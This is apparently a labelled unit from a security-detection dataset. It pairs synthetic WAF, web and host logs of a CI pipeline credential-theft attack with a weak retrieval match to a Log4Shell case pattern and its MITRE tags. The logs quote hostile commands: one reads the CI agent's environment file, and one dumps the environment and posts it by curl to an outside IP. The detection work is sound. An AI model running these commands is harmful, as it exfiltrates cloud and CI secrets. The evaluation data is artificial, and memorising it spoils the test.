@@ -1,0 +1,185 @@
+{
+ "unit": 1127,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "CI 环境变量密钥窃取（after_script 读取 agent.env 外带 AWS 密钥）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-06 15:24:49",
+   "source": "waf",
+   "log_id": "WAF0442593",
+   "content": "/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;",
+   "event_id": "1127-WAF0442593"
+  },
+  {
+   "timestamp": "2026-07-06 15:24:50",
+   "source": "web",
+   "log_id": "WEB0445472",
+   "content": "/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;",
+   "event_id": "1127-WEB0445472"
+  },
+  {
+   "timestamp": "2026-07-06 15:24:52",
+   "source": "rasp",
+   "log_id": "RASP0489693",
+   "content": "https://app-spring-19.ops-corp.com/api/v2/jobs/8841/trace {\"env_dump\": \"AWS_SECRET_ACCESS_KEY\", \"step\": \"after",
+   "event_id": "1127-RASP0489693"
+  },
+  {
+   "timestamp": "2026-07-06 15:26:50",
+   "source": "hids",
+   "log_id": "HID0479659",
+   "content": "cat /etc/ci/agent.env /bin/cat cat /etc/ci/agent.env <== /bin/sh -c 'cat agent.env' <== java -jar ci.jar",
+   "event_id": "1127-HID0479659"
+  },
+  {
+   "timestamp": "2026-07-06 15:28:18",
+   "source": "hids",
+   "log_id": "HID0479667",
+   "content": "curl -d@/tmp/e 10.20.5.19 /bin/sh curl -d@/tmp/e 10.20.5.19 <== /bin/sh -c 'env>/tmp/e' <== java -jar ci.jar",
+   "event_id": "1127-HID0479667"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 1,
+   "detected_steps": 1,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S3",
+     "action_id": "log4shell_java_child_cmd",
+     "label": "java 进程派生子 shell 执行命令",
+     "generic": true,
+     "event_ids": [
+      "1127-HID0479659",
+      "1127-HID0479667"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "aligned_event_id": "1127-HID0479667",
+     "detections": [
+      {
+       "event_id": "1127-HID0479659",
+       "source": "hids",
+       "timestamp": "2026-07-06 15:26:50"
+      },
+      {
+       "event_id": "1127-HID0479667",
+       "source": "hids",
+       "timestamp": "2026-07-06 15:28:18"
+      }
+     ]
+    }
+   ],
+   "source_mismatches": [],
+   "unaligned_detections": [
+    {
+     "event_id": "1127-HID0479659",
+     "step_id": "S3",
+     "action_id": "log4shell_java_child_cmd",
+     "source": "hids",
+     "timestamp": "2026-07-06 15:26:50",
+     "reason": "extra_detection_for_S3"
+    }
+   ],
+   "keyword_score": 0,
+   "keyword_details": [],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2"
+   ],
+   "before_steps": [
+    "S1",
+    "S2"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0,
+   "pattern_scope": {
+    "attack_family": "Log4j2 JNDI 注入（CVE-2021-44228）",
+    "variant_note": "由单个合成样本归纳；RMI/DNS 协议变体与二次载荷形式尚未多实例验证。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "横向移动",
+     "凭据窃取",
+     "反序列化回显"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S3",
+    "label": "java 进程派生子 shell 执行命令",
+    "sources": [
+     "hids"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1127-HID0479659",
+     "1127-HID0479667"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 0,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1105"
+  ]
+ }
+}
